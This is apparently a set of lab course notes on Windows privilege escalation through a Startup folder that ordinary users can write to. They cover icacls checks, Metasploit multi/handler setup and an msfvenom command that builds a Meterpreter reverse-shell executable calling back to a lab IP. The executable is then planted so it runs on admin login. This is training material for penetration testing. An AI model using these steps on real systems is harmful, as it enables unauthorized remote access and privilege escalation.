# ✨ Startup Applications

Startup applications in Windows are programs or scripts that automatically initiate when a user logs into the system. In the context of privilege escalation (privesc), attackers often leverage the execution of malicious code during system startup to elevate their privileges.

<figure><img src="../../../../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

### Overview <a href="#lecture_heading" id="lecture_heading"></a>

we are going to use a tool called icalcs.exe

#### `icacls.exe`

* **Purpose:** `icacls.exe` is a command-line utility that allows users to display and modify permissions on objects in the file system.
* **Usage:** Used for viewing or modifying ACLs, which define the permissions users and groups have on a particular file or directory.

**Access Control List (ACL):** A list associated with an object (e.g., file, directory) that specifies the permissions granted or denied to users or groups.

Access Control Lists (ACLs) are a fundamental concept in computer security, specifically in the context of operating systems like Windows. ACLs define permissions and access rights to resources, such as files, folders, or registry keys.

We are going to run this command&#x20;

```
// Some code
```

<figure><img src="../../../../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

* **`icacls.exe`:** This is the executable for the command-line tool that deals with ACLs.
* **`"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`:** This is the path to the Startup folder where programs are launched automatically when a user logs in.

The BUILTIN\Users group is a default Windows security group that includes all user accounts created on the system. When Full Control permissions \<F>  are granted to this group, it means that members of the Users group have complete access and control over the specified resources, such as files, directories, or services.

{% embed url="https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/icacls" %}

<figure><img src="../../../../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

### Escalation <a href="#lecture_heading" id="lecture_heading"></a>

To gain elevated privileges, head out on your Kali machine, load msfconsole and use the multi/handler:

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp
4. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

now on another terminal generate the payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.141.112 -f exe -o y.exe
```

* `-p windows/meterpreter/reverse_tcp`: Specifies the payload as a reverse TCP Meterpreter shell for Windows.
* `LHOST=10.10.141.112`: Sets the local host IP address to 10.10.141.112. This is the IP address where the reverse shell will connect back.
* `-f exe`: Specifies the output format as an executable (exe) file.
* `-o y.exe`: Defines the output file as "y.exe."

<figure><img src="../../../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

I then made a simple local python server and went on the windows machine to download my file in the startup folder located at :&#x20;

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`

<figure><img src="../../../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Now we are going to simulate a admin login to our machie with the payload injected in the startup programs

Disconnect from the session and launch your msfconsole:

<figure><img src="../../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Then connect to the box with the TCM account&#x20;

<figure><img src="../../../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

We connect to the rdesktop with admin credentials, the startup payload executes and our meterpreter session returns us a shell.
